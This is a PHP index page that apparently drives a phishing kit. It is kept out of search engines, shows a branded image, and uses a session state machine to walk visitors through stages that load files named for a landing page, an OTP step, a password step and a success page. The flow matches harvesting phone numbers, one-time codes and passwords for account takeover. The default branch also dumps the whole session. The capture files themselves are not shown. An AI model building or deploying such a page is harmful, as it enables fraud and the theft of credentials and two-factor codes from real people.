<?php require("_core.php"); ?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title><?= $TITLE ?></title>
  <meta name="robots" content="nofollow, noindex" />
  <link rel="shortcut icon" href="assets/images/icon.png" />
  <link rel="stylesheet" href="assets/vendors/fontAwesome/css/font-awesome.min.css" />
  <link rel="stylesheet" href="assets/vendors/Bootstrap/css/bootstrap.min.css" />
  <style>
      #loader {
        height: 100vh;width: 100vw;
        position: fixed;top:0;
        background: rgba(255,255,255, .7);
        display: flex;align-items: center;
        justify-content: center;
      }
    
      .loader {
        width: 45px;
        aspect-ratio: 1;
        --c: no-repeat linear-gradient(#000000 0 0);
        background: 
          var(--c) 0%   50%,
          var(--c) 50%  50%,
          var(--c) 100% 50%;
        background-size: 20% 100%;
        animation: l1 .5s infinite linear;
      }
      @keyframes l1 {
        0%  {background-size: 20% 100%,20% 100%,20% 100%}
        33% {background-size: 20% 10% ,20% 100%,20% 100%}
        50% {background-size: 20% 100%,20% 10% ,20% 100%}
        66% {background-size: 20% 100%,20% 100%,20% 10% }
        100%{background-size: 20% 100%,20% 100%,20% 100%}
      }
  </style>
  <script src="assets/vendors/jQuery/jquery.min.js"></script>
</head>
<body>
  <div style="width: 100%;padding: 0px 16px;max-width: 500px;margin: auto;">
    <img class="w-100 mb-3" src="assets/27b109e0-895a-4cf2-ad96-9f9d5cc127d3.jpeg" />
    <?Php
      if(!isset($_SESSION["state"]) OR isset($_GET["otherAccount"])) {
        $_SESSION["state"] = "start";
      }
      
       $F = $_SESSION["state"];
      switch($F) {
        case "start": require("Lander.php"); break;
        case "phone": require("OTPC.php"); break;
        case "otp":   require("PASS.php"); break;
        case "success": require("SCCS.php"); break;
        default: print_r($_SESSION);
      }
    ?>
  </div>
  <div id="loader"><div class="loader"></div></div>
  <script>$("#loader").hide();</script>
</body>
</html>